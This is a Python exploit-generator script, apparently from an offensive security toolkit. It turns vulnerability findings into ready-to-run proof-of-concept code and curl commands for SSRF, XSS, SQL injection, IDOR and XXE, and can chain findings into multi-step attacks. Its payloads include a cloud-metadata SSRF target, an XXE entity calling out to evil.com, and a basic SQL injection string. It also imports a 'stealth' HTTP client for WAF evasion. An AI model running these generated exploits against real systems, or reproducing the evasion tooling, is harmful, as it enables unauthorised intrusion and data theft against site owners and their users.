#!/usr/bin/env python3
"""Exploit Generator

Generates exploit code/POCs for validated vulnerabilities.
Supports multiple output formats: Python, curl, JavaScript, Markdown.
"""

import os
import json
from typing import Dict, Any, List, Optional
from datetime import datetime

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)



EXPLOIT_TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "..", "templates", "exploit_templates")


def generate_exploit(finding: Dict[str, Any], format: str = "python") -> str:
    """Generate exploit code for a finding
    
    Args:
        finding: Finding dictionary with vulnerability details
        format: Output format (python, curl, javascript, markdown)
        
    Returns:
        Generated exploit code as string
    """
    vuln_type = finding.get("type") or finding.get("vulnerability_type", "").lower()
    
    # Map common vulnerability types
    if "ssrf" in vuln_type:
        return _generate_ssrf_exploit(finding, format)
    elif "xss" in vuln_type:
        return _generate_xss_exploit(finding, format)
    elif "sql" in vuln_type or "sqli" in vuln_type:
        return _generate_sqli_exploit(finding, format)
    elif "idor" in vuln_type:
        return _generate_idor_exploit(finding, format)
    elif "xxe" in vuln_type:
        return _generate_xxe_exploit(finding, format)
    else:
        return _generate_generic_exploit(finding, format)


def _generate_ssrf_exploit(finding: Dict[str, Any], format: str) -> str:
    """Generate SSRF exploit"""
    url = finding.get("url") or finding.get("uri", "http://example.com/api/fetch")
    payload = finding.get("payload") or finding.get("evidence", {}).get("payload", "http://169.254.169.254/latest/meta-data/")
    param = finding.get("param") or "url"
    
    if format == "python":
        return f"""#!/usr/bin/env python3
\"\"\"SSRF Exploit - {finding.get('name', 'SSRF Vulnerability')}\"\"\"


target_url = "{url}"
ssrf_payload = "{payload}"

# Exploit SSRF
response = safe_get(target_url, params={{{param!r}: ssrf_payload}})
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:500]}}")
"""
    elif format == "curl":
        return f"""# SSRF Exploit
curl -X GET "{url}?{param}={payload}"
"""
    elif format == "markdown":
        return f"""## SSRF Exploit

**Target:** `{url}`

**Payload:**
```
{payload}
```

**Request:**
```bash
curl "{url}?{param}={payload}"
```

**Expected Result:** Server makes request to internal endpoint
"""
    else:
        return f"SSRF exploit for {url} with payload {payload}"


def _generate_xss_exploit(finding: Dict[str, Any], format: str) -> str:
    """Generate XSS exploit"""
    url = finding.get("url") or finding.get("uri", "http://example.com/search")
    payload = finding.get("payload") or "<script>alert(document.domain)</script>"
    param = finding.get("param") or "q"
    
    if format == "python":
        return f"""#!/usr/bin/env python3
\"\"\"XSS Exploit - {finding.get('name', 'XSS Vulnerability')}\"\"\"


target_url = "{url}"
xss_payload = "{payload}"

# Exploit XSS
response = safe_get(target_url, params={{{param!r}: xss_payload}})
print(f"Status: {{response.status_code}}")
print(f"Payload reflected: {{xss_payload in response.text}}")
"""
    elif format == "javascript":
        return f"""// XSS Exploit
const url = "{url}";
const payload = "{payload}";
const exploitUrl = `${{url}}?{param}=${{encodeURIComponent(payload)}}`;

// Open in new window to trigger XSS
window.open(exploitUrl);
"""
    elif format == "markdown":
        return f"""## XSS Exploit

**Target:** `{url}`

**Payload:**
```
{payload}
```

**Exploit URL:**
```
{url}?{param}={payload}
```

**Instructions:** Open the exploit URL in a browser to trigger XSS
"""
    else:
        return f"XSS exploit for {url} with payload {payload}"


def _generate_sqli_exploit(finding: Dict[str, Any], format: str) -> str:
    """Generate SQL injection exploit"""
    url = finding.get("url") or finding.get("uri", "http://example.com/api/users")
    payload = finding.get("payload") or "1' OR '1'='1"
    param = finding.get("param") or "id"
    
    if format == "python":
        return f"""#!/usr/bin/env python3
\"\"\"SQL Injection Exploit - {finding.get('name', 'SQLi Vulnerability')}\"\"\"


target_url = "{url}"
sqli_payload = "{payload}"

# Exploit SQLi
response = safe_get(target_url, params={{{param!r}: sqli_payload}})
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:500]}}")
"""
    elif format == "curl":
        return f"""# SQL Injection Exploit
curl -X GET "{url}?{param}={payload}"
"""
    else:
        return f"SQLi exploit for {url} with payload {payload}"


def _generate_idor_exploit(finding: Dict[str, Any], format: str) -> str:
    """Generate IDOR exploit"""
    url = finding.get("url") or finding.get("uri", "http://example.com/api/users/1")
    
    if format == "python":
        return f"""#!/usr/bin/env python3
\"\"\"IDOR Exploit - {finding.get('name', 'IDOR Vulnerability')}\"\"\"


# Original URL (your own resource)
original_url = "{url}"

# Try accessing another user's resource
import re
id_match = re.search(r'/(\\d+)/', original_url)
if id_match:
    original_id = id_match.group(1)
    # Try with different ID
    test_id = str(int(original_id) + 1)
    test_url = original_url.replace(f"/{{original_id}}/", f"/{{test_id}}/")
    
    response = safe_get(test_url)
    print(f"Status: {{response.status_code}}")
    if response.status_code == 200:
        print("IDOR confirmed - accessed another user's resource")
        print(f"Response: {{response.text[:500]}}")
"""
    else:
        return f"IDOR exploit for {url} - modify resource ID in URL"


def _generate_xxe_exploit(finding: Dict[str, Any], format: str) -> str:
    """Generate XXE exploit"""
    url = finding.get("url") or finding.get("uri", "http://example.com/api/upload")
    callback_url = finding.get("callback_url") or "http://evil.com/xxe"
    
    xxe_payload = f"""<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "{callback_url}">
]>
<foo>&xxe;</foo>"""
    
    if format == "python":
        return f"""#!/usr/bin/env python3
\"\"\"XXE Exploit - {finding.get('name', 'XXE Vulnerability')}\"\"\"


target_url = "{url}"
xxe_payload = '''{xxe_payload}'''

# Exploit XXE
headers = {{"Content-Type": "application/xml"}}
response = safe_post(target_url, data=xxe_payload, headers=headers)
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:500]}}")
"""
    elif format == "curl":
        return f"""# XXE Exploit
curl -X POST "{url}" \\
  -H "Content-Type: application/xml" \\
  -d '{xxe_payload.replace(chr(10), "\\n")}'
"""
    else:
        return f"XXE exploit for {url}"


def _generate_generic_exploit(finding: Dict[str, Any], format: str) -> str:
    """Generate generic exploit"""
    url = finding.get("url") or finding.get("uri", "http://example.com")
    payload = finding.get("payload") or finding.get("evidence", {}).get("payload", "")
    
    if format == "python":
        return f"""#!/usr/bin/env python3
\"\"\"Exploit - {finding.get('name', 'Vulnerability')}\"\"\"


target_url = "{url}"
payload = "{payload}"

# Exploit
response = safe_get(target_url, params={{"payload": payload}})
print(f"Status: {{response.status_code}}")
print(f"Response: {{response.text[:500]}}")
"""
    else:
        return f"Exploit for {url} with payload {payload}"


def generate_chain_exploit(chain: List[Dict[str, Any]], format: str = "markdown") -> str:
    """Generate exploit for an entire chain
    
    Args:
        chain: List of findings in the chain
        format: Output format
        
    Returns:
        Generated exploit code
    """
    if format == "markdown":
        exploit = f"""# Exploitation Chain: {chain[0].get('name', 'Multi-Step Attack')}

**Description:** {chain[0].get('description', 'Multi-step attack chain')}

## Steps

"""
        for i, step in enumerate(chain, 1):
            step_exploit = generate_exploit(step, "markdown")
            exploit += f"### Step {i}: {step.get('name', 'Unknown')}\n\n"
            exploit += step_exploit
            exploit += "\n\n"
        
        exploit += "## Execution Order\n\n"
        exploit += "Execute steps in sequence, using output of step N as input for step N+1.\n"
        
        return exploit
    else:
        # Generate code for each step
        exploits = []
        for step in chain:
            exploits.append(generate_exploit(step, format))
        return "\n\n# Next step\n\n".join(exploits)


if __name__ == "__main__":
    import argparse
    
    ap = argparse.ArgumentParser(description="Exploit Generator")
    ap.add_argument("--finding-file", help="JSON file with finding")
    ap.add_argument("--format", default="python", choices=["python", "curl", "javascript", "markdown"])
    args = ap.parse_args()
    
    if args.finding_file:
        with open(args.finding_file, "r") as f:
            finding = json.load(f)
        exploit = generate_exploit(finding, args.format)
        print(exploit)
    else:
        print("Usage: python exploit_generator.py --finding-file finding.json --format python")

